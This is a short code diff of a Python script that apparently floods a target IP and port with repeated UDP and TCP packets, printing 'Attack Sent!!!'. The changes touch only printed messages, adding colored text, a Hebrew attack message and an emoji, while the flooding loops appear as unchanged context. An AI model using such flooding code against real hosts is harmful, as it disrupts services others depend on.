@@ -74,7 +74,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"Attack Sent!!!")
+			print(i + "Attack Sent!!!")
 		except:
 			print("[!] Error!!!")
 
@@ -89,10 +89,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i + "\033[33mלתקוף את פרוטוקול הנתונים של המשתמש\033[0m")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("[💥] \033[31mError!!!\033[0m")
             
 
 def run4():
